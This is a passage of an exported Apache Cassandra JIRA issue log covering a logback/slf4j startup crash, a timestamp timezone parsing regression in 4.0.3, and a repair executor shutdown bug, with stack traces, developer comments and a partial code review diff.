    at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:288)
    at org.apache.cassandra.service.CassandraDaemon.<clinit>(CassandraDaemon.java:117)
Caused by: java.lang.ClassNotFoundException: org.slf4j.event.LoggingEvent
    at java.net.URLClassLoader.findClass(URLClassLoader.java:382)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:419)
    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:352)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:352)
    ... 27 more
Exception in thread ""main"" java.lang.NoClassDefFoundError: org/slf4j/event/LoggingEvent
    at java.lang.Class.getDeclaredMethods0(Native Method)
    at java.lang.Class.privateGetDeclaredMethods(Class.java:2701)
    at java.lang.Class.privateGetPublicMethods(Class.java:2902)
    at java.lang.Class.getMethods(Class.java:1615)
    at ch.qos.logback.core.joran.util.beans.BeanDescriptionFactory.create(BeanDescriptionFactory.java:35)
    at ch.qos.logback.core.joran.util.beans.BeanDescriptionCache.getBeanDescription(BeanDescriptionCache.java:47)
    at ch.qos.logback.core.joran.util.PropertySetter.<init>(PropertySetter.java:68)
    at ch.qos.logback.core.joran.action.NestedComplexPropertyIA.isApplicable(NestedComplexPropertyIA.java:65)
    at ch.qos.logback.core.joran.spi.Interpreter.lookupImplicitAction(Interpreter.java:233)
    at ch.qos.logback.core.joran.spi.Interpreter.getApplicableActionList(Interpreter.java:252)
    at ch.qos.logback.core.joran.spi.Interpreter.startElement(Interpreter.java:142)
    at ch.qos.logback.core.joran.spi.Interpreter.startElement(Interpreter.java:128)
    at ch.qos.logback.core.joran.spi.EventPlayer.play(EventPlayer.java:50)
    at ch.qos.logback.core.joran.GenericConfigurator.doConfigure(GenericConfigurator.java:165)
    at ch.qos.logback.core.joran.GenericConfigurator.doConfigure(GenericConfigurator.java:152)
    at ch.qos.logback.core.joran.GenericConfigurator.doConfigure(GenericConfigurator.java:110)
    at ch.qos.logback.core.joran.GenericConfigurator.doConfigure(GenericConfigurator.java:53)
    at ch.qos.logback.classic.util.ContextInitializer.configureByResource(ContextInitializer.java:65)
    at ch.qos.logback.classic.util.ContextInitializer.autoConfig(ContextInitializer.java:140)
    at org.slf4j.impl.StaticLoggerBinder.init(StaticLoggerBinder.java:84)
    at org.slf4j.impl.StaticLoggerBinder.<clinit>(StaticLoggerBinder.java:55)
    at org.slf4j.LoggerFactory.bind(LoggerFactory.java:129)
    at org.slf4j.LoggerFactory.performInitialization(LoggerFactory.java:108)
    at org.slf4j.LoggerFactory.getILoggerFactory(LoggerFactory.java:302)
    at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:276)
    at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:288)
    at org.apache.cassandra.service.CassandraDaemon.<clinit>(CassandraDaemon.java:117)
Caused by: java.lang.ClassNotFoundException: org.slf4j.event.LoggingEvent
    at java.net.URLClassLoader.findClass(URLClassLoader.java:382)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:419)
    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:352)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:352)
    ... 27 more

{code}

It seems like the version of logback introduced in https://issues.apache.org/jira/browse/CASSANDRA-17204 requires a more up to date version of slf4j-api.jar than what is currently shipped with Cassandra (see https://www.slf4j.org/codes.html#log4j_version).

Replacing the shipped version (1.7.7) with the most recent 1.7.X (1.7.36 at the time of this writing) seemingly solves the problem.  ",,adelapena,bereng,tobiasg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Mar/22 11:27;tobiasg;logback.xml;https://issues.apache.org/jira/secure/attachment/13041528/logback.xml",,,,,1.0,brandon.williams,,,,,,,,,,,,,,Availability -> Process Crash,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Mar 31 12:24:32 UTC 2022,,,,,,,All,,,,"0|z10qug:",9223372036854775807,,,,bereng,brandon.williams,,,Normal,,3.11.12,,https://github.com/apache/cassandra/commit/f32d2b06de63258888f28c0dba33db4912be6da8,,,,,,,,,run CI,,,,,"23/Mar/22 11:50;brandon.williams;Can you provide more details about your environment?  I don't think your analysis is correct, as multiple CI systems have no problem running this and I also tested myself without issue.;;;","24/Mar/22 11:29;tobiasg;Sure, a custom logback config file is used (attached). I tried running with the standard config and it does, indeed, not crash.

This is what the command line looks like:

{code}

/usr/bin/java -Dcassandra.skip_wait_for_gossip_to_settle=0 -Dcassandra.max_queued_native_transport_requests=1024 -Dcassandra.disable_max_protocol_auto_override=t
rue -javaagent:/jmx_prometheus_agent.jar=3042:/apache-cassandra-3.11.12/conf/prometheus-config.yaml -Xloggc:/apache-cassandra-3.11.12/logs/gc.log -ea -XX:+UseThreadPriorities -XX:Thr
eadPriorityPolicy=42 -XX:+HeapDumpOnOutOfMemoryError -Xss256k -XX:StringTableSize=1000003 -XX:-UseBiasedLocking -XX:+UseTLAB -XX:+ResizeTLAB -XX:+UseNUMA -XX:+PerfDisableSharedMem -D
java.net.preferIPv4Stack=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:+CMSParallelRemarkEnabled -XX:SurvivorRatio=8 -XX:MaxTenuringThreshold=1 -XX:CMSInitiatingOccupancyFraction
=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSWaitDuration=10000 -XX:+CMSParallelInitialMarkEnabled -XX:+CMSEdenChunksRecordAlways -XX:+CMSClassUnloadingEnabled -XX:+PrintGCDetails -
XX:+PrintGCDateStamps -XX:+PrintHeapAtGC -XX:+PrintTenuringDistribution -XX:+PrintGCApplicationStoppedTime -XX:+PrintPromotionFailure -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles
=10 -XX:GCLogFileSize=10M -Xms512M -Xmx512M -Xmn100M -XX:+UseCondCardMark -XX:CompileCommandFile=/apache-cassandra-3.11.12/conf/hotspot_compiler -javaagent:/apache-cassandra-3.11.12/
lib/jamm-0.3.0.jar -Dcassandra.jmx.local.port=7199 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.password.file=/etc/cassandra/jmxremote.password -D
java.library.path=/apache-cassandra-3.11.12/lib/sigar-bin -XX:OnOutOfMemoryError=kill -9 %p -Dlogback.configurationFile=logback.xml -Dcassandra.logdir=/apache-cassandra-3.11.12/logs
-Dcassandra.storagedir=/apache-cassandra-3.11.12/data -Dcassandra-foreground=yes -cp /apache-cassandra-3.11.12/conf:/apache-cassandra-3.11.12/build/classes/main:/apache-cassandra-3.1
1.12/build/classes/thrift:/apache-cassandra-3.11.12/lib/HdrHistogram-2.1.9.jar:/apache-cassandra-3.11.12/lib/ST4-4.0.8.jar:/apache-cassandra-3.11.12/lib/airline-0.6.jar:/apache-cassa
ndra-3.11.12/lib/antlr-runtime-3.5.2.jar:/apac

{code}

Let me know if more info is needed.;;;","24/Mar/22 12:53;brandon.williams;I see, thanks that helps!  I went with 1.7.25 to bring 3.11 in line with later branches. [Branch|https://github.com/driftx/cassandra/tree/CASSANDRA-17480] and [Circle|https://app.circleci.com/pipelines/github/driftx/cassandra/409/workflows/fbdc570c-37f2-4089-a9b8-5de9fa1523a5].;;;","25/Mar/22 07:47;bereng;+1 LGTM assuming j11 is also green which I wasn't able to find by myself sorry;;;","25/Mar/22 11:12;brandon.williams;Don't worry, this is 3.11 only so there's no j11 run. :);;;","25/Mar/22 11:19;brandon.williams;Committed, thanks.;;;","25/Mar/22 11:25;bereng;Doh! of course! lol;;;","25/Mar/22 19:06;adelapena;[~brandon.williams] [~bereng] It seems that the Jenkins run for this commit shows multiple new failures on {{materialized_views_test.py::TestMaterializedViews}}:

https://ci-cassandra.apache.org/job/Cassandra-3.11/341/#showFailuresLink

I'm running those tests on circle:

https://app.circleci.com/pipelines/github/adelapena/cassandra/1449/workflows/f34efdf0-0a3f-43b9-b542-0ea243015f18/jobs/14809

;;;","25/Mar/22 19:55;brandon.williams;Very strange since we updated to the version we're already using in 4.0.  I'll take a look.

Reverted in 3a7e5f8ed8;;;","26/Mar/22 06:51;bereng;Mmmmm weird weird specially when circle was green...;;;","29/Mar/22 19:57;brandon.williams;Interestingly when I manually recreate a test (these are so much fun to do that way) it produces:

{noformat}
Digest mismatch: {} [Native-Transport-Requests-1] 
{noformat}
 
in the trace, indicating it's swallowing the exception... which only deepens the mystery.  I confirmed this is the case by modifying the dtest to only look for that part and indeed it passes.;;;","30/Mar/22 16:11;brandon.williams;It appears that slf4j will no longer interpolate an exception directly and instead interprets it as another argument to print, resulting in the braces and then the exception on the next line.  I've changed this to the exception's string and that passes.

[Branch|https://github.com/driftx/cassandra/tree/CASSANDRA-17474] and [circle|https://app.circleci.com/pipelines/github/driftx/cassandra/417/workflows/5d0d51fe-fc99-48f8-97e4-ef68e0d24f57].
;;;","31/Mar/22 06:55;bereng;Let's see what [jenkins|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1550/] has to say which is where we tripped over last time...;;;","31/Mar/22 12:06;bereng;I think jenkins looks ok to me matching to the latest 3.11. Wdyt?;;;","31/Mar/22 12:10;brandon.williams;I don't see any new failures that aren't timeouts so I think it's good.;;;","31/Mar/22 12:18;bereng;Send it! +1;;;","31/Mar/22 12:24;brandon.williams;Committed, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Timestamp issue with Cassandra 4.0.3 with Timezone value,CASSANDRA-17467,13434980,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,anandbil,anandbil,21/Mar/22 19:28,27/May/22 19:25,13/Jul/23 08:40,23/Mar/22 14:30,4.0.4,4.1,4.1-alpha1,,,,CQL/Syntax,,,,0,,"Hello Team ,

 

Facing one issue related to the timestamp type in cassandra 4.0.3 version . This is not repro in 3.11.x and works fine in 3.11.

 

when i have table with timestamp as fields :

 

CREATE TABLE timetest (

    id int PRIMARY KEY,

    enddate timestamp,

    startdate timestamp

)

*Now when try to insert the record like :*

INSERT INTO timetest (id,startdate,enddate) VALUES (1 ,'2022-03-20 12:48:56 +0530','2022-03-20 12:48:56 +0530')

I am receiving error:

 

""{color:#de350b}InvalidRequest{color}: Error from server: code=2200 [Invalid query] message=""Unable to parse a date/time from '2022-03-20 12:48:56 +0530'"".

 ** 

*This works fine on 3.11 but fails on 4.x.*

 

*same issue if we query the record:*

 

select * from timetest where id = 1 and enddate = '2022-03-20 12:48:56 +0530';

{color:#de350b}InvalidRequest{color}: Error from server: code=2200 [Invalid query] message=""Unable to parse a date/time from '2022-03-20 12:48:56 +0530'""

 

 

{color:#ffab00}*If we change the timestamp value and remove the extra space which is present before the timezone value then it works fine in 4.x*{color}

 

if we change timestamp value From {'2022-03-20 12:48:{color:#de350b}56 +0530{color}'}  To    {'2022-03-20 12:48:{color:#ffab00}56+0530{color}’} then 4.0.3 accept this value otherwise not. but 3.11 was accepting both the values.

 

This is causing a challenge for upgrading from 3.11 to 4.x.

 

Seeking help on this issue and any fix / workaround or suitable Cassandra version which is higher than 3.11 but lesser then 4.0.3 which can be used to fix this issue asap.

 

 

 

 ",,anandbil,bereng,yifanc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-15976,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Mar 23 18:51:20 UTC 2022,,,,,,,All,,,,"0|z10op4:",9223372036854775807,,,,bereng,,,,Normal,,4.0-beta2,,https://github.com/apache/cassandra/commit/4f5feac0dffe2e8b4ae1cb32670e4902fab11ccc,,,,,,,,,run CI,,,,,"21/Mar/22 22:23;brandon.williams;It looks like CASSANDRA-15976 is what broke this.;;;","22/Mar/22 06:22;anandbil;Thanks [~brandon.williams] for updates.

This issue is impacting our upgrade from 3.11 to 4.x.

any tentative timeline when can fix for this be available ? it will help us plan-out our  next steps accordingly;;;","22/Mar/22 12:16;brandon.williams;I intend for any fix to be available in 4.0.4.;;;","22/Mar/22 18:43;anandbil;Thanks [~brandon.williams] .

 

*Any tentative timeline , when 4.0.4 release will be out ?*

 

This will help us to plan accordingly.;;;","22/Mar/22 18:45;brandon.williams;Release times cannot be predicted in the project, but I will push for one when this is completed.;;;","22/Mar/22 22:07;brandon.williams;In CASSANDRA-15976, we switched from using [SimpleDateFormat|https://docs.oracle.com/javase/10/docs/api/java/text/SimpleDateFormat.html] to [DateTimeFormatter|https://docs.oracle.com/javase/8/docs/api/java/time/format/DateTimeFormatter.html] which have _nearly_ identical formats.  Previously this case was caught by the 'yyyy-MM-dd HH:mm:ss z' SDF pattern, but 'z' in DTF format does not cover this and instead needs the 'X' identifier.

||Branch||CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17467-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/405/workflows/1bab3bb5-abf9-4a0e-9ff0-c40288b27038] , [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/405/workflows/cd5d68ca-c145-4be8-a057-3aca3c350b56]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17467-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/404/workflows/693a48ec-0e75-461d-9ec2-4ed272470622] , [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/404/workflows/25b0fc44-4770-4cc0-bf82-c76651419818]|
;;;","23/Mar/22 06:46;bereng;The 4.0/j11 dtests CI seems it had some env issue. But the same tests under j8 passed so it looks like a circle glitch. The RepairJob junit failure passes locally.

I have left a [comment|https://github.com/driftx/cassandra/commit/6c9957b5519a692103f7e48a0fdf8f0184d7d191#diff-0bfa363b41fc597e25157684be7ed5e0a68b82a278075796b4464bbf3d762503R130] on the PR that can be addressed on commit.

LGTM once we confirm it was a circle glitch. +1.;;;","23/Mar/22 12:03;brandon.williams;I added your tests and I guess the best way to confirm it's a glitch is run it again: j11 on [4.0|https://app.circleci.com/pipelines/github/driftx/cassandra/406/workflows/661b130a-cf10-483a-96a7-ee499c850dde] and [trunk|https://app.circleci.com/pipelines/github/driftx/cassandra/407/workflows/1e476e43-7439-4717-a404-12657f3d0a45].  I will check those in a bit and commit if they look good.;;;","23/Mar/22 13:19;bereng;Yeah LGTM now. +1.;;;","23/Mar/22 14:30;brandon.williams;Committed, thanks!;;;","23/Mar/22 18:46;anandbil;Thanks [~brandon.williams] and [~brandon.williams] for quick resolution on this issue.

 

How can this fix be up-taken and applied to environment so that it can be verified  if this resolve the raised  issue and allow to upgrade from 3.x to 4.x.

do one need to wait till 4.0.4 is out or build can be provided along with this fix  for user's consumption so that  upgrade can resume ?

 

 

 ;;;","23/Mar/22 18:51;brandon.williams;We don't provide non-release builds generally but given that everything is opensource there is nothing to stop you from building it yourself, otherwise it will be in 4.0.4.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Shut repair task executor down without interruption to avoid compromising shared channel proxies,CASSANDRA-17466,13434979,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maedhroz,maedhroz,maedhroz,21/Mar/22 19:24,27/May/22 19:25,13/Jul/23 08:40,28/Mar/22 20:53,4.0.4,4.1,4.1-alpha1,,,,Consistency/Repair,,,,0,,"If a {{RepairJob}} gets past validation, it builds a list of {{SyncTask}} items and fires them off. If any one of those fails, we grab the relevant exception and throw it up from {{RepairJob}} to {{RepairSession}}.

{noformat}
ERROR 2022-03-09T23:53:36,721 [Stream-Deserializer-/10.246.3.102:7000-d97958c4] org.apache.cassandra.streaming.StreamSession:1110 - [Stream #07c55da0-a047-11ec-8122-ab911c7a993f] Remote peer /10.246.3.102:7000 failed stream session.
{noformat}

{{RepairSession}} then marks itself as being terminated and clears its internal maps of active validations and sync tasks, but immediately before it does that, it calls {{shutdownNow()}} on the executor that executes those tasks. In the case of our failing stream session, we may still have other running stream tasks whose threads' interrupt flag has been set, and this can have some unintended negative consequences, because any {{ChannelProxy}} interrupted in the middle of a blocking operation will both be closed and throw a {{ClosedByInterruptException}}. (Keep in mind that we share {{ChannelProxy}} instances outside a few specific cases, like those introduced in CASSANDRA-15666.)

We've seen this manifest in production in a couple ways, both of them while trying to read from the {{peers_v2}} system table:

{noformat}
Exception in thread Thread[RepairJobTask:23,5,main]""^M
exception=""FSReadError in .../data/system/peers_v2-c4325fbb8e5e3bafbd070f9250ed818e/system-peers_v2-nb-99-big-Data.db
        at org.apache.cassandra.io.util.ChannelProxy.read(ChannelProxy.java:143)
        at org.apache.cassandra.io.util.CompressedChunkReader$Standard.readChunk(CompressedChunkReader.java:115)
        at org.apache.cassandra.io.util.BufferManagingRebufferer.rebuffer(BufferManagingRebufferer.java:79)
        at org.apache.cassandra.io.util.RandomAccessReader.reBufferAt(RandomAccessReader.java:68)
        at org.apache.cassandra.io.util.RandomAccessReader.seek(RandomAccessReader.java:210)
        at org.apache.cassandra.io.util.FileHandle.createReader(FileHandle.java:151)
        at org.apache.cassandra.io.sstable.format.SSTableReader.getFileDataInput(SSTableReader.java:1628)
        at org.apache.cassandra.db.columniterator.AbstractSSTableIterator.<init>(AbstractSSTableIterator.java:96)
        at org.apache.cassandra.db.columniterator.SSTableIterator.<init>(SSTableIterator.java:48)
        at org.apache.cassandra.io.sstable.format.big.BigTableReader.iterator(BigTableReader.java:75)
        at org.apache.cassandra.io.sstable.format.big.BigTableReader.iterator(BigTableReader.java:67)
        at org.apache.cassandra.db.StorageHook$1.makeRowIterator(StorageHook.java:87)
        at org.apache.cassandra.db.SinglePartitionReadCommand.queryMemtableAndSSTablesInTimestampOrder(SinglePartitionReadCommand.java:897)
        at org.apache.cassandra.db.SinglePartitionReadCommand.queryMemtableAndDiskInternal(SinglePartitionReadCommand.java:605)
        at org.apache.cassandra.db.SinglePartitionReadCommand.queryMemtableAndDisk(SinglePartitionReadCommand.java:578)
        at org.apache.cassandra.db.SinglePartitionReadCommand.queryStorage(SinglePartitionReadCommand.java:412)
        at org.apache.cassandra.db.ReadCommand.executeLocally(ReadCommand.java:414)
        at org.apache.cassandra.db.SinglePartitionReadQuery$Group.executeLocally(SinglePartitionReadQuery.java:242)
        at org.apache.cassandra.db.SinglePartitionReadQuery$Group.executeInternal(SinglePartitionReadQuery.java:216)
        at org.apache.cassandra.cql3.statements.SelectStatement.executeInternal(SelectStatement.java:458)
        at org.apache.cassandra.cql3.statements.SelectStatement.executeLocally(SelectStatement.java:442)
        at org.apache.cassandra.cql3.statements.SelectStatement.executeLocally(SelectStatement.java:96)
        at org.apache.cassandra.cql3.QueryProcessor.executeInternal(QueryProcessor.java:334)
        at org.apache.cassandra.db.SystemKeyspace.getPreferredIP(SystemKeyspace.java:973)
        at org.apache.cassandra.net.OutboundConnectionSettings.connectTo(OutboundConnectionSettings.java:455)
        at org.apache.cassandra.net.OutboundConnectionSettings.withDefaults(OutboundConnectionSettings.java:484)
        at org.apache.cassandra.streaming.DefaultConnectionFactory.createConnection(DefaultConnectionFactory.java:49)
        at org.apache.cassandra.streaming.async.NettyStreamingMessageSender.createChannel(NettyStreamingMessageSender.java:199)
        at org.apache.cassandra.streaming.async.NettyStreamingMessageSender.setupControlMessageChannel(NettyStreamingMessageSender.java:180)
        at org.apache.cassandra.streaming.async.NettyStreamingMessageSender.sendMessage(NettyStreamingMessageSender.java:245)
        at org.apache.cassandra.streaming.async.NettyStreamingMessageSender.initialize(NettyStreamingMessageSender.java:149)
        at org.apache.cassandra.streaming.StreamSession.start(StreamSession.java:372)
        at org.apache.cassandra.streaming.StreamCoordinator.startSession(StreamCoordinator.java:262)
        at org.apache.cassandra.streaming.StreamCoordinator.access$700(StreamCoordinator.java:36)
        at org.apache.cassandra.streaming.StreamCoordinator$HostStreamingData.connectAllStreamSessions(StreamCoordinator.java:308)
        at org.apache.cassandra.streaming.StreamCoordinator.connectAllStreamSessions(StreamCoordinator.java:107)
        at org.apache.cassandra.streaming.StreamCoordinator.connect(StreamCoordinator.java:101)
        at org.apache.cassandra.streaming.StreamResultFuture.createInitiator(StreamResultFuture.java:98)
        at org.apache.cassandra.streaming.StreamPlan.execute(StreamPlan.java:179)
        at org.apache.cassandra.repair.LocalSyncTask.startSync(LocalSyncTask.java:113)
        at org.apache.cassandra.repair.SyncTask.run(SyncTask.java:89)
        at java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)
        at com.google.common.util.concurrent.TrustedListenableFutureTask$TrustedFutureInterruptibleTask.runInterruptibly(TrustedListenableFutureTask.java:125)
        at com.google.common.util.concurrent.InterruptibleTask.run(InterruptibleTask.java:57)
        at com.google.common.util.concurrent.TrustedListenableFutureTask.run(TrustedListenableFutureTask.java:78)
        at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
        at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
        at java.base/java.lang.Thread.run(Thread.java:834)
Caused by: java.nio.channels.ClosedByInterruptException
        at java.base/java.nio.channels.spi.AbstractInterruptibleChannel.end(AbstractInterruptibleChannel.java:199)
        at java.base/sun.nio.ch.FileChannelImpl.endBlocking(FileChannelImpl.java:162)
        at java.base/sun.nio.ch.FileChannelImpl.readInternal(FileChannelImpl.java:816)
        at java.base/sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:796)
        at org.apache.cassandra.io.util.ChannelProxy.read(ChannelProxy.java:139)
        ... 48 more
{noformat}

In this case, the {{SyncTask}} is trying to read the preferred remote IP for the node it wants to communicate with, but when it reads the {{peers_v2}} table, it finds that it's already been closed by an interrupt, and {{StorageProxy#read()}} wraps the {{ClosedByInterruptException}} in a {{FSReadError}}, which triggers the disk failure policy, and kills the node.

{noformat}
message=""Exception in thread Thread[CompactionExecutor:1690,1,main]""^M
exception=""FSReadError in …/data/system/peers_v2-c4325fbb8e5e3bafbd070f9250ed818e/system-peers_v2-nb-99-big-Data.db
        at org.apache.cassandra.io.util.ChannelProxy.read(ChannelProxy.java:143)
        at org.apache.cassandra.io.util.CompressedChunkReader$Standard.readChunk(CompressedChunkReader.java:115)
        at org.apache.cassandra.io.util.BufferManagingRebufferer.rebuffer(BufferManagingRebufferer.java:79)
        at org.apache.cassandra.io.util.RandomAccessReader.reBufferAt(RandomAccessReader.java:68)
        at org.apache.cassandra.io.util.RandomAccessReader.seek(RandomAccessReader.java:210)
        at org.apache.cassandra.io.sstable.format.big.BigTableScanner.seekToCurrentRangeStart(BigTableScanner.java:196)
        at org.apache.cassandra.io.sstable.format.big.BigTableScanner.access$400(BigTableScanner.java:52)
        at org.apache.cassandra.io.sstable.format.big.BigTableScanner$KeyScanningIterator.computeNext(BigTableScanner.java:305)
        at org.apache.cassandra.io.sstable.format.big.BigTableScanner$KeyScanningIterator.computeNext(BigTableScanner.java:282)
        at org.apache.cassandra.utils.AbstractIterator.hasNext(AbstractIterator.java:46)
        at org.apache.cassandra.io.sstable.format.big.BigTableScanner.hasNext(BigTableScanner.java:261)
        at org.apache.cassandra.utils.MergeIterator$Candidate.advance(MergeIterator.java:376)
        at org.apache.cassandra.utils.MergeIterator$ManyToOne.advance(MergeIterator.java:188)
        at org.apache.cassandra.utils.MergeIterator$ManyToOne.computeNext(MergeIterator.java:157)
        at org.apache.cassandra.utils.AbstractIterator.hasNext(AbstractIterator.java:46)
        at org.apache.cassandra.db.partitions.UnfilteredPartitionIterators$2.hasNext(UnfilteredPartitionIterators.java:169)
        at org.apache.cassandra.db.transform.BasePartitions.hasNext(BasePartitions.java:93)
        at org.apache.cassandra.db.compaction.CompactionIterator.hasNext(CompactionIterator.java:254)
        at org.apache.cassandra.db.compaction.CompactionTask.runMayThrow(CompactionTask.java:202)
        at org.apache.cassandra.utils.WrappedRunnable.run(WrappedRunnable.java:28)
        at org.apache.cassandra.db.compaction.CompactionTask.executeInternal(CompactionTask.java:78)
        at org.apache.cassandra.db.compaction.AbstractCompactionTask.execute(AbstractCompactionTask.java:100)
        at org.apache.cassandra.db.compaction.CompactionManager$BackgroundCompactionCandidate.run(CompactionManager.java:363)
        at java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)
        at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
        at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
        at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
        at java.base/java.lang.Thread.run(Thread.java:834)
Caused by: java.nio.channels.ClosedChannelException
        at java.base/sun.nio.ch.FileChannelImpl.ensureOpen(FileChannelImpl.java:150)
        at java.base/sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:790)
        at org.apache.cassandra.io.util.ChannelProxy.read(ChannelProxy.java:139)
        ... 28 more
{noformat}

In this case, we've been lucky enough to terminate the repair itself without any issues, but when we try to read from the {{ChannelProxy}} from another thread, we get a {{ClosedChannelException}}, which is also wrapped in a {{FSReadError}}, which triggers the disk failure policy and kills the node. A lot of violence here. Note that, in this case, while the channel is closed, we don't see a {{ClosedByInterruptException}}, because the repair job task thread, not the compaction thread, is interrupted.

(Note: This reproduces easiest w/ {{disk_access_mode: mmap_index_only}}.)",,bereng,dcapwell,jmckenzie,maedhroz,,,,,,,,,,,"maedhroz commented on pull request #1521:
URL: https://github.com/apache/cassandra/pull/1521#issuecomment-1076592672


   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17466-4.0&filter=all


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;23/Mar/22 17:18;githubbot;600","maedhroz commented on pull request #1522:
URL: https://github.com/apache/cassandra/pull/1522#issuecomment-1076592780


   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17466-trunk&filter=all


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;23/Mar/22 17:21;githubbot;600","josh-mckenzie commented on a change in pull request #1522:
URL: https://github.com/apache/cassandra/pull/1522#discussion_r834499439



##########
File path: test/distributed/org/apache/cassandra/distributed/test/RepairErrorsTest.java
##########
@@ -20,27 +20,37 @@
 
 import java.io.IOException;
 import java.util.Collection;
-import java.util.UUID;
-
-import org.assertj.core.api.Assertions;
-import org.junit.Test;
+import java.util.concurrent.Callable;
+import java.util.concurrent.TimeUnit;
 
 import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
 import net.bytebuddy.implementation.MethodDelegation;
+import net.bytebuddy.implementation.bind.annotation.SuperCall;
+import org.apache.cassandra.db.SystemKeyspace;

Review comment:
       Looks like import ordering could use some love in this file.

##########
File path: src/java/org/apache/cassandra/repair/RepairSession.java
##########
@@ -372,8 +373,24 @@ public void terminate()
     public void forceShutdown(Throwable reason)
     {
         tryFailure(reason);
-        taskExecutor.shutdownNow();
+        taskExecutor.shutdown();
         terminate();
+        awaitTaskExecutorTermination();
+    }
+
+    private void awaitTaskExecutorTermination()
+    {
+        try
+        {
+            if (taskExecutor.awaitTermination(30, TimeUnit.SECONDS))

Review comment:
       What was the reasoning behind the 30 second timeout window here? Might be worth commenting on the selection of this time window.

##########
File path: src/java/org/apache/cassandra/streaming/StreamSession.java
##########
@@ -183,34 +191,35 @@
     private final TimeUUID pendingRepair;
     private final PreviewKind previewKind;
 
-    /**
-     * State Transition:
-     *
-     * <pre>
-     *  +------------------+----------> FAILED <--------------------+
-     *  |                  |              ^                         |
-     *  |                  |              |       initiator         |
-     *  INITIALIZED --> PREPARING --> STREAMING ------------> WAIT_COMPLETE ----> COMPLETED
-     *  |                  |              |                         ^                 ^
-     *  |                  |              |       follower          |                 |
-     *  |                  |              +-------------------------)-----------------+
-     *  |                  |                                        |                 |
-     *  |                  |         if preview                     |                 |
-     *  |                  +----------------------------------------+                 |
-     *  |               nothing to request or to transfer                             |
-     *  +-----------------------------------------------------------------------------+
-     *                  nothing to request or to transfer
-     *
-     *  </pre>
-     */
+/**
+ * State Transition:
+ *
+ * <pre>
+ *  +------------------+-----> FAILED | ABORTED <---------------+
+ *  |                  |              ^                         |
+ *  |                  |              |       initiator         |
